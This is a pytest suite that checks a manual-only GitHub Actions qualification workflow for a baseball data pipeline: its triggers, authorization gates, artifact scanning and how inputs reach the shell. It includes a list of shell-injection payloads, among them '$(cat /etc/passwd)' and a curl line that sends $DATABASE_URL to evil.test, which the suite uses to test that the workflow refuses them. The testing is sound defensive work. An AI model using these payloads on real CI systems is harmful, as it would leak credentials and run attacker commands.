"""Structure of the manual no-op write qualification workflow.

The reviewed workflow source is the authority for how this qualification can be
invoked. These tests own the properties that make it manual-only and
single-game: no schedule, no push, no pull request, no workflow_run, no
repository dispatch, exactly one game input, an exact SHA confirmation, an exact
operator confirmation, main-only, owner-only.

They also own the property that adding this qualification disturbed nothing:
the scheduled sync workflow keeps its lanes, its shadow modes, its backfill
default, and its credential-free observer.
"""

import os
import re
import subprocess
import tempfile
from pathlib import Path

import pytest
import yaml


REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOW_PATH = (
    REPO_ROOT / '.github/workflows/manual-game-driven-noop-qualification.yml'
)
SYNC_WORKFLOW_PATH = REPO_ROOT / '.github/workflows/baseballos-sync.yml'

JOB = 'noop-write-qualification'
REPOSITORY = 'NickolisK24/bullpen-intel-engine'
MODE_ENV = 'GAME_DRIVEN_INGESTION_MODE'

PRODUCTION_CREDENTIALS = (
    'DATABASE_URL', 'SECRET_KEY', 'ADMIN_API_TOKEN',
    'BASEBALLOS_ADMIN_API_TOKEN', 'BASEBALLOS_SYNC_URL',
)

FORBIDDEN_TRIGGERS = (
    'schedule', 'push', 'pull_request', 'pull_request_target',
    'workflow_run', 'repository_dispatch', 'issue_comment', 'release',
)


@pytest.fixture(scope='module')
def workflow_text():
    return WORKFLOW_PATH.read_text(encoding='utf-8')


@pytest.fixture(scope='module')
def workflow(workflow_text):
    return yaml.safe_load(workflow_text)


@pytest.fixture(scope='module')
def triggers(workflow):
    # PyYAML resolves a bare `on:` key to the boolean True.
    return workflow[True]


@pytest.fixture(scope='module')
def job(workflow):
    return workflow['jobs'][JOB]


@pytest.fixture(scope='module')
def inputs(triggers):
    return triggers['workflow_dispatch']['inputs']


def _steps(job):
    return list(job.get('steps') or ())


def _step(job, fragment):
    for step in _steps(job):
        if fragment.lower() in str(step.get('name', '')).lower():
            return step
    raise AssertionError(f'no step matching {fragment!r}')


# ── Trigger contract ────────────────────────────────────────────────────────


def test_the_workflow_file_exists():
    assert WORKFLOW_PATH.is_file()


def test_workflow_dispatch_is_the_only_trigger(triggers):
    assert list(triggers) == ['workflow_dispatch']


@pytest.mark.parametrize('trigger', FORBIDDEN_TRIGGERS)
def test_no_automatic_trigger_exists(triggers, trigger):
    assert trigger not in triggers


def test_no_cron_expression_appears_anywhere(workflow_text):
    assert 'cron' not in workflow_text.lower()


def test_only_one_job_exists(workflow):
    assert list(workflow['jobs']) == [JOB]


# ── Input contract ──────────────────────────────────────────────────────────


def test_exactly_the_four_declared_inputs_exist(inputs):
    assert sorted(inputs) == [
        'confirmation', 'expected_head_sha', 'game_pk', 'operator_note',
    ]


@pytest.mark.parametrize(
    'name', ['game_pk', 'expected_head_sha', 'confirmation'],
)
def test_authorization_inputs_are_required(inputs, name):
    assert inputs[name]['required'] is True


def test_the_operator_note_is_optional_and_cannot_authorize(inputs):
    assert inputs['operator_note']['required'] is False
    assert inputs['operator_note'].get('default') == ''


def test_the_game_input_is_a_single_game(inputs):
    described = inputs['game_pk']['description'].lower()
    assert 'exactly one' in described
    for forbidden in ('list', 'comma', 'range', 'date', 'wildcard'):
        assert forbidden in described


def test_the_confirmation_input_names_its_exact_required_form(inputs):
    assert 'QUALIFY_NOOP_GAME_' in inputs['confirmation']['description']


# ── Authorization gates ─────────────────────────────────────────────────────


def test_the_job_is_gated_on_every_authorization_condition(job):
    condition = ' '.join(str(job['if']).split())
    assert "github.event_name == 'workflow_dispatch'" in condition
    assert f"github.repository == '{REPOSITORY}'" in condition
    assert "github.ref == 'refs/heads/main'" in condition
    assert 'github.actor == github.repository_owner' in condition


def test_a_preflight_step_refuses_before_any_checkout_or_credential(job):
    steps = _steps(job)
    guard_index = next(
        index for index, step in enumerate(steps)
        if 'refuse' in str(step.get('name', '')).lower()
    )
    checkout_index = next(
        index for index, step in enumerate(steps)
        if 'checkout' in str(step.get('uses', '')).lower()
    )
    assert guard_index < checkout_index


def test_the_preflight_refuses_a_non_integer_game(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert "grep -Eq '^[1-9][0-9]*$'" in guard


def test_the_preflight_requires_a_full_forty_character_sha(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert "grep -Eq '^[0-9a-f]{40}$'" in guard


def test_the_preflight_compares_the_supplied_sha_to_the_resolved_commit(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert '"$INPUT_EXPECTED_HEAD_SHA" != "$RESOLVED_SHA"' in guard


def test_the_preflight_requires_the_exact_confirmation_for_that_game(job):
    guard = _step(job, 'Refuse an unauthorized invocation')['run']
    assert 'QUALIFY_NOOP_GAME_${INPUT_GAME_PK}' in guard


def test_the_checkout_pins_the_reviewed_commit(job):
    checkout = next(
        step for step in _steps(job)
        if 'checkout' in str(step.get('uses', '')).lower()
    )
    assert checkout['with']['ref'] == '${{ github.sha }}'


# ── Authority the workflow must not grant ───────────────────────────────────


def test_the_workflow_never_sets_the_lane_mode_itself(workflow_text):
    # The qualification supplies the mode per phase, in code, under review.
    # A workflow-level mode would be an activation lever outside that review.
    for line in workflow_text.splitlines():
        stripped = line.strip()
        if stripped.startswith('#'):
            continue
        assert f'{MODE_ENV}:' not in stripped


def test_the_workflow_cannot_request_backfill(workflow_text):
    lowered = workflow_text.lower()
    assert '--include-backfill' not in lowered
    assert 'mode=backfill' not in lowered


def test_the_workflow_cannot_request_authoritative_mode(workflow_text):
    assert 'authoritative' not in workflow_text.lower().replace(
        'authoritative publication', ''
    ).replace('authoritative mode', '')


def test_the_workflow_invokes_only_the_qualification_entry_point(workflow_text):
    for forbidden in (
        'run_daily_sync.py', 'run_postgame_refresh.py',
        'run_tonight_refresh.py', 'refresh_slate_schedule.py',
        'appearance_ledger_audit.py',
    ):
        assert forbidden not in workflow_text


def test_the_qualification_runs_exactly_one_game_from_the_input(job):
    run = _step(job, 'Run the no-op write qualification')['run']
    assert '--game-pk "$INPUT_GAME_PK"' in run
    assert run.count('--game-pk') == 1


# ── Serialization against other production writers ──────────────────────────


def test_it_shares_the_production_sync_concurrency_lane(workflow):
    assert workflow['concurrency']['group'] == 'baseballos-sync'


def test_cancel_in_progress_cannot_kill_a_run_mid_transaction(workflow):
    assert workflow['concurrency']['cancel-in-progress'] is False


def test_permissions_are_read_only(workflow):
    assert workflow['permissions'] == {'contents': 'read'}


def test_the_job_is_time_bounded(job):
    assert isinstance(job['timeout-minutes'], int)
    assert job['timeout-minutes'] <= 30


# ── Evidence ordering ───────────────────────────────────────────────────────


def test_the_artifact_is_scanned_before_it_is_uploaded(job):
    steps = _steps(job)
    scan = next(
        index for index, step in enumerate(steps)
        if step.get('id') == 'scan'
    )
    upload = next(
        index for index, step in enumerate(steps)
        if step.get('id') == 'upload'
    )
    assert scan < upload


def test_an_unsafe_artifact_is_never_uploaded(job):
    upload = next(step for step in _steps(job) if step.get('id') == 'upload')
    assert "steps.scan.outcome == 'success'" in str(upload['if'])


def test_the_shared_forbidden_content_scanner_is_reused(job):
    scan = _step(job, 'Scan the evidence artifact')['run']
    assert 'scan_forbidden_artifact_content.py' in scan


def test_the_artifact_uploads_before_the_final_gate(job):
    steps = _steps(job)
    upload = next(
        index for index, step in enumerate(steps) if step.get('id') == 'upload'
    )
    gate = next(
        index for index, step in enumerate(steps)
        if 'final qualification gate' in str(step.get('name', '')).lower()
    )
    assert upload < gate


def test_the_artifact_is_run_scoped_and_retained_for_thirty_days(job):
    upload = next(step for step in _steps(job) if step.get('id') == 'upload')
    assert upload['with']['name'] == (
        'game-driven-noop-qualification-${{ github.run_id }}'
    )
    assert upload['with']['retention-days'] == 30
    assert upload['with']['if-no-files-found'] == 'error'


# ── The final gate cannot be softened ───────────────────────────────────────


def test_the_final_gate_is_not_continue_on_error(job):
    gate = _step(job, 'Final qualification gate')
    assert gate.get('continue-on-error') is not True


def test_a_failed_scan_upload_or_qualification_all_fail_the_gate(job):
    gate = _step(job, 'Final qualification gate')
    env = gate.get('env') or {}
    assert env['SCAN_OUTCOME'] == '${{ steps.scan.outcome }}'
    assert env['UPLOAD_OUTCOME'] == '${{ steps.upload.outcome }}'
    assert env['QUALIFICATION_OUTCOME'] == '${{ steps.qualification.outcome }}'
    script = gate['run']
    for variable in ('$SCAN_OUTCOME', '$UPLOAD_OUTCOME', '$QUALIFICATION_OUTCOME'):
        assert variable in script
    assert script.count('exit 1') >= 3


def test_the_qualification_step_exits_with_its_own_verdict(job):
    """continue-on-error must not become a way to hide a non-zero verdict."""
    run = _step(job, 'Run the no-op write qualification')['run']
    assert 'exit "$exit_code"' in run


def test_the_scan_step_exits_with_its_own_result(job):
    run = _step(job, 'Scan the evidence artifact')['run']
    assert 'exit "$exit_code"' in run


def test_the_gate_states_it_authorizes_nothing_further(job):
    gate = _step(job, 'Final qualification gate')['run'].lower()
    assert 'does not authorize' in gate
    for claim in (
        'activated', 'legacy writer retired',
        'production replacement complete', 'safe for automated writes',
    ):
        assert claim not in gate


def test_the_summary_never_claims_authority_activation(workflow_text):
    lowered = workflow_text.lower()
    for claim in (
        'legacy writer retired', 'production replacement complete',
        'safe for automated writes',
    ):
        assert claim not in lowered


# ── Shell validity ──────────────────────────────────────────────────────────


def test_every_shell_block_parses(job):
    for step in _steps(job):
        script = step.get('run')
        if not script:
            continue
        with tempfile.NamedTemporaryFile(
            'w', suffix='.sh', delete=False,
        ) as handle:
            handle.write(script)
            path = handle.name
        try:
            result = subprocess.run(
                ['bash', '-n', path], capture_output=True, text=True,
            )
        finally:
            Path(path).unlink(missing_ok=True)
        assert result.returncode == 0, step.get('name')


# ── Regression: the scheduled pipeline is untouched ─────────────────────────


@pytest.fixture(scope='module')
def sync_workflow():
    return yaml.safe_load(SYNC_WORKFLOW_PATH.read_text(encoding='utf-8'))


def test_the_scheduled_sync_still_has_its_three_schedules(sync_workflow):
    crons = [entry['cron'] for entry in sync_workflow[True]['schedule']]
    assert crons == ['0 10 * * *', '0 14 * * *', '0 2,4,6 * * *']


def test_the_scheduled_sync_never_invokes_this_qualification(sync_workflow):
    encoded = str(sync_workflow)
    assert 'run_game_driven_noop_qualification' not in encoded
    assert 'noop-write-qualification' not in encoded


def test_daily_and_postgame_remain_shadow(sync_workflow):
    modes = []
    for job in sync_workflow['jobs'].values():
        for step in job.get('steps') or ():
            env = step.get('env') or {}
            if MODE_ENV in env:
                modes.append(env[MODE_ENV])
    assert sorted(modes) == ['off', 'shadow', 'shadow']


def test_the_shadow_observer_remains_credential_free(sync_workflow):
    observer = sync_workflow['jobs']['shadow-activation-health']
    encoded = str(observer)
    assert 'secrets.' not in encoded
    for credential in PRODUCTION_CREDENTIALS:
        assert credential not in encoded


def test_public_sync_and_shadow_health_remain_separate(sync_workflow):
    jobs = sync_workflow['jobs']
    assert jobs['shadow-activation-health']['needs'] == 'public-sync'
    for downstream in ('internal-enrichment', 'static-team-story-preview'):
        assert jobs[downstream]['needs'] == 'public-sync'


# ── Shell boundary (Blocker 1) ──────────────────────────────────────────────
# GitHub substitutes `${{ }}` into the script text BEFORE bash parses it, so an
# expression inside a `run:` block turns user input into shell code — in a step
# that holds production credentials. Sanitising in Python happens far too late.
# Every user-controlled value must cross into the shell through `env:` only.

USER_CONTROLLED_INPUTS = (
    'game_pk', 'expected_head_sha', 'confirmation', 'operator_note',
)

EXPECTED_INPUT_ENV = {
    'INPUT_GAME_PK': '${{ inputs.game_pk }}',
    'INPUT_EXPECTED_HEAD_SHA': '${{ inputs.expected_head_sha }}',
    'INPUT_CONFIRMATION': '${{ inputs.confirmation }}',
    'INPUT_OPERATOR_NOTE': '${{ inputs.operator_note }}',
}


def _run_steps(job):
    return [step for step in _steps(job) if step.get('run')]


@pytest.mark.parametrize('name', USER_CONTROLLED_INPUTS)
def test_no_input_expression_appears_inside_any_run_script(job, name):
    for step in _run_steps(job):
        assert '${{ inputs.%s' % name not in step['run'], step.get('name')
        assert '${{ inputs.' not in step['run'], step.get('name')


def test_no_github_expression_at_all_appears_inside_any_run_script(job):
    """Broader than required, and deliberately so: it removes the whole class."""
    for step in _run_steps(job):
        assert '${{' not in step['run'], step.get('name')


def test_every_user_controlled_input_crosses_the_boundary_through_env(job):
    referencing = [
        step for step in _run_steps(job)
        if any(
            variable in step['run'] for variable in EXPECTED_INPUT_ENV
        )
    ]
    assert referencing, 'no step consumes the inputs at all'
    for step in referencing:
        env = step.get('env') or {}
        for variable in EXPECTED_INPUT_ENV:
            if variable in step['run']:
                assert env.get(variable) == EXPECTED_INPUT_ENV[variable], (
                    step.get('name'), variable,
                )


def test_the_preflight_receives_all_four_inputs_through_env(job):
    env = _step(job, 'Refuse an unauthorized invocation').get('env') or {}
    for variable, expression in EXPECTED_INPUT_ENV.items():
        assert env.get(variable) == expression


def test_the_qualification_step_receives_all_four_inputs_through_env(job):
    env = _step(job, 'Run the no-op write qualification').get('env') or {}
    for variable, expression in EXPECTED_INPUT_ENV.items():
        assert env.get(variable) == expression


def test_every_input_is_referenced_only_as_a_quoted_shell_variable(job):
    """Each use must be exactly `"$VAR"` or `${VAR}` inside a quoted string.

    A bare `$VAR` would word-split and glob-expand the value.
    """
    for step in _run_steps(job):
        script = step['run']
        for variable in EXPECTED_INPUT_ENV:
            name = re.escape(variable)
            total = len(re.findall(r'\$\{?' + name, script))
            if not total:
                continue
            # "$VAR"
            quoted = len(re.findall(r'"\$' + name + r'"', script))
            # "...${VAR}..." — braced form, inside a double-quoted string
            braced = len(re.findall(
                r'"[^"\n]*\$\{' + name + r'\}[^"\n]*"', script,
            ))
            assert quoted + braced == total, (
                step.get('name'), variable, total, quoted, braced,
            )


HOSTILE_NOTES = (
    '$(touch /tmp/pwned)',
    '`touch /tmp/pwned`',
    '; touch /tmp/pwned',
    '&& touch /tmp/pwned',
    '| touch /tmp/pwned',
    '" ; touch /tmp/pwned ; echo "',
    "' ; touch /tmp/pwned ; echo '",
    'line one\ntouch /tmp/pwned',
    '$SECRET_KEY',
    '${DATABASE_URL}',
    '$(cat /etc/passwd)',
    '"; curl http://evil.test -d "$DATABASE_URL',
)


@pytest.mark.parametrize('hostile', HOSTILE_NOTES)
def test_a_hostile_operator_note_stays_inert_input_text(job, hostile, tmp_path):
    """Execute the real preflight script with a hostile note.

    The note must remain data. If any construction executed, the canary file
    would exist.
    """
    script = _step(job, 'Refuse an unauthorized invocation')['run']
    canary = tmp_path / 'pwned'
    sha = 'a' * 40
    env = {
        'PATH': os.environ.get('PATH', ''),
        'INPUT_GAME_PK': '824488',
        'INPUT_EXPECTED_HEAD_SHA': sha,
        'INPUT_CONFIRMATION': 'QUALIFY_NOOP_GAME_824488',
        'INPUT_OPERATOR_NOTE': hostile.replace('/tmp/pwned', str(canary)),
        'RESOLVED_SHA': sha,
    }
    path = tmp_path / 'preflight.sh'
    path.write_text(script)
    result = subprocess.run(
        ['bash', str(path)], capture_output=True, text=True, env=env,
    )
    assert result.returncode == 0, result.stderr
    assert not canary.exists(), 'the operator note executed a command'
    assert 'Authorization preconditions satisfied.' in result.stdout


@pytest.mark.parametrize('hostile', HOSTILE_NOTES)
def test_a_hostile_game_pk_cannot_execute_and_is_refused(job, hostile, tmp_path):
    script = _step(job, 'Refuse an unauthorized invocation')['run']
    canary = tmp_path / 'pwned'
    sha = 'a' * 40
    env = {
        'PATH': os.environ.get('PATH', ''),
        'INPUT_GAME_PK': hostile.replace('/tmp/pwned', str(canary)),
        'INPUT_EXPECTED_HEAD_SHA': sha,
        'INPUT_CONFIRMATION': 'QUALIFY_NOOP_GAME_824488',
        'INPUT_OPERATOR_NOTE': '',
        'RESOLVED_SHA': sha,
    }
    path = tmp_path / 'preflight.sh'
    path.write_text(script)
    result = subprocess.run(
        ['bash', str(path)], capture_output=True, text=True, env=env,
    )
    assert result.returncode == 1
    assert not canary.exists(), 'the game_pk executed a command'


@pytest.mark.parametrize('hostile', HOSTILE_NOTES)
def test_a_hostile_confirmation_cannot_execute_and_is_refused(
    job, hostile, tmp_path,
):
    script = _step(job, 'Refuse an unauthorized invocation')['run']
    canary = tmp_path / 'pwned'
    sha = 'a' * 40
    env = {
        'PATH': os.environ.get('PATH', ''),
        'INPUT_GAME_PK': '824488',
        'INPUT_EXPECTED_HEAD_SHA': sha,
        'INPUT_CONFIRMATION': hostile.replace('/tmp/pwned', str(canary)),
        'INPUT_OPERATOR_NOTE': '',
        'RESOLVED_SHA': sha,
    }
    path = tmp_path / 'preflight.sh'
    path.write_text(script)
    result = subprocess.run(
        ['bash', str(path)], capture_output=True, text=True, env=env,
    )
    assert result.returncode == 1
    assert not canary.exists(), 'the confirmation executed a command'


def test_a_hostile_sha_cannot_execute_and_is_refused(tmp_path, job):
    script = _step(job, 'Refuse an unauthorized invocation')['run']
    canary = tmp_path / 'pwned'
    env = {
        'PATH': os.environ.get('PATH', ''),
        'INPUT_GAME_PK': '824488',
        'INPUT_EXPECTED_HEAD_SHA': f'$(touch {canary})',
        'INPUT_CONFIRMATION': 'QUALIFY_NOOP_GAME_824488',
        'INPUT_OPERATOR_NOTE': '',
        'RESOLVED_SHA': 'a' * 40,
    }
    path = tmp_path / 'preflight.sh'
    path.write_text(script)
    result = subprocess.run(
        ['bash', str(path)], capture_output=True, text=True, env=env,
    )
    assert result.returncode == 1
    assert not canary.exists()
